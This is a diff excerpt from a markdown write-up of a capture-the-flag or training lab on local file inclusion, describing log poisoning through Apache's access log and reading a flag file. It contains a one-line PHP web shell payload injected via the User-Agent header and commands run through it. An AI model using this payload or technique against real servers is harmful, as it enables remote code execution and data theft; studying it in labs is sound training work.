@@ -62,3 +62,17 @@ Using image upload first we create web shell file that we will use to upload as 
 using burpsuite we send intercept address <code>http://SERVER_IP:PORT/index.php?language=/var/log/apache2/access.log</code> and by changing user-agent to <code><code><</code>?php system($_GET['cmd']); ?></code> we can inject commands, we also need to change end of url by adding in this case <code>&cmd=pwd</code>
   
 ![Screenshot 2024-12-01 202623](https://github.com/user-attachments/assets/c0ea16db-a9f4-4c97-9c78-8f36ced111f6)
+
+<h2>Task:  Try to use a different technique to gain RCE and read the flag at / /</h2>
+using burpsuit url encoder we can send command to check the files that are inside directory /
+
+![Screenshot 2024-12-01 214032](https://github.com/user-attachments/assets/6d125a2a-4b77-4059-8193-7c487417b127)
+
+![Screenshot 2024-12-01 214138](https://github.com/user-attachments/assets/a7ff890c-41e2-43a1-be6a-38197963c7d6)
+
+after finding flag file we encode it as url using <code>cat /FlagFileName.txt</code> which give us our flag file contents
+
+![Screenshot 2024-12-01 214322](https://github.com/user-attachments/assets/ef19dddd-00a0-4fd7-9b8c-251fc24d8551)
+
+<h1><ins>Automated Scanning</ins></h1>
+<h2>Task: Fuzz the web application for exposed parameters, then try to exploit it with one of the LFI wordlists to read /flag.txt/</h2>
